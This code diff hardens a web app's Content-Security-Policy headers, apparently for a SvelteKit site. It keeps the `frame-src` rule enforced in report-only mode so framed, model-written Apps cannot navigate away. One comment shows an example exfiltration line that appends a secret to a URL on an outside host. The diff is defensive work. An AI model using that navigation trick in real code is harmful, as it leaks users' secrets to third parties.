@@ -17,6 +17,12 @@
 //  2. The document-only headers are additionally scoped away from `/api/`, the
 //     same predicate the pre-existing Cache-Control rule uses, so the file
 //     routes cannot be reached by rule 1 failing.
+//
+// One directive is enforced in every CSP mode but `off`: the page policy's own
+// `frame-src` (see `frameSrcDirective`). A model-written App runs in a frame of
+// our own pages and can navigate that frame out to any address; its own CSP
+// cannot stop that, the page's `frame-src` can, so it must not wait for the
+// day an operator flips the whole policy from report-only to enforce.
 
 export type CspMode = "off" | "report-only" | "enforce";
 
@@ -136,6 +142,30 @@ export function appendCspSources(
 }
 
 /**
+ * The policy's own `frame-src` directive, as written, or null when it has none.
+ *
+ * It is the one directive that decides where a frame OF THIS PAGE may go, and
+ * that includes a navigation the framed document starts itself: an App's
+ * `location = "https://elsewhere/?" + secret`, a meta refresh, an anchor click.
+ * The framed document's own CSP has no say in that (`navigate-to`, the
+ * directive that would, shipped nowhere), so the embedding page's `frame-src`
+ * is the only brake. Taken from the policy SvelteKit built rather than written
+ * out here, so the one place that says what a frame may load stays
+ * `kit.csp.directives['frame-src']` in svelte.config.js.
+ *
+ * Only the first `frame-src` counts, as in a browser: a later duplicate of a
+ * directive is ignored. `child-src` and `default-src` are not consulted; a
+ * policy that never named `frame-src` has no frame rule of its own to enforce.
+ */
+export function frameSrcDirective(policy: string): string | null {
+	for (const segment of policy.split(";")) {
+		const trimmed = segment.trim();
+		if (trimmed.split(/\s+/)[0]?.toLowerCase() === "frame-src") return trimmed;
+	}
+	return null;
+}
+
+/**
  * The origin a browser would POST Sentry envelopes to, derived from a DSN, or
  * null when there is no usable DSN. Only the origin is taken: a DSN carries a
  * public key in its userinfo, and that has no business in a response header.
@@ -207,10 +237,19 @@ export function buildSecurityHeaders(
 	if (csp !== null) {
 		const policy = appendCspSources(csp, "connect-src", extraConnectSources);
 		if (cspMode === "off") {
+			// The documented escape hatch: no CSP at all, so a CSP problem can
+			// never be the reason a deploy has to be rolled back.
 			remove.push("content-security-policy");
 		} else if (cspMode === "report-only") {
-			remove.push("content-security-policy");
 			set["content-security-policy-report-only"] = policy;
+			// The full policy is only observed, but the frame rule is enforced
+			// beside it: the enforcing header becomes `frame-src` alone (a policy
+			// with no other directive blocks nothing else). A policy with no
+			// `frame-src` has no frame rule to enforce, and the enforcing header
+			// SvelteKit set is dropped as it always was.
+			const frames = frameSrcDirective(policy);
+			if (frames === null) remove.push("content-security-policy");
+			else set["content-security-policy"] = frames;
 		} else {
 			set["content-security-policy"] = policy;
 		}
